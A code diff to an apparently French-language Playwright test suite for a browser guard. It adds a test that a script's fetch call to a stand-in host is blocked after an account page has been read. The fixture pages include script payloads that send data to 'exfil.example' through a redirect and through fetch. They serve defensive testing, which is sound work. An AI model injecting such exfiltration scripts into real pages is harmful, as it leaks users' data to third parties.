@@ -1,6 +1,6 @@
-"""Garde du navigateur avec un vrai Chromium (Playwright) : redirections et navigations bloquees.
+"""Garde du navigateur avec un vrai Chromium (Playwright) : navigation, redirections et exfiltration active.
 
-Reseau simule par interception : aucune requete ne sort. Ignore si Playwright ou Chromium manque.
+Réseau simulé par interception : aucune requête ne sort. Ignore si Playwright ou Chromium manque.
 """
 from __future__ import annotations
 
@@ -21,6 +21,7 @@ PAGES = {
     "https://www.youtube.com/relative": (301, {"location": "/feed"}, ""),
     "https://www.youtube.com/feed": (200, {}, "<p>Flux</p>"),
     "https://www.youtube.com/js": (200, {}, "<script>location.href='https://exfil.example/c?d=1234'</script>"),
+    "https://www.youtube.com/fetch": (200, {}, "<script>fetch('https://exfil.example/c?d=1234').catch(()=>{});</script>"),
     "https://exfil.example/c?d=1234": (200, {}, "<p>recu</p>"),
 }
 
@@ -46,7 +47,7 @@ def chromium():
     b.served = []
     try:
         b.start()
-    except Exception as exc:  # Chromium absent sur cette machine
+    except Exception as exc:
         pytest.skip(f"Chromium indisponible : {exc}")
     b.state = state
     b.goto("https://dashboard.stripe.com/")
@@ -75,7 +76,14 @@ def test_script_navigation_to_third_party_is_blocked(chromium):
     assert "https://exfil.example/c?d=1234" not in chromium.served
 
 
-def test_public_pages_still_load_before_any_account_read(tmp_path):
+def test_fetch_to_third_party_is_blocked_after_account_read(chromium):
+    chromium.goto("https://www.youtube.com/fetch")
+    chromium._page.wait_for_timeout(500)
+    assert chromium.blocked == ["https://exfil.example/c?d=1234"]
+    assert "https://exfil.example/c?d=1234" not in chromium.served
+
+
+def test_public_pages_still_load_before_any_account_read():
     state = BrowseState()
     b = SimulatedNetwork(headless=True, persistent=False, guard=lambda u: web_guard.allowed(u, state))
     b.served = []
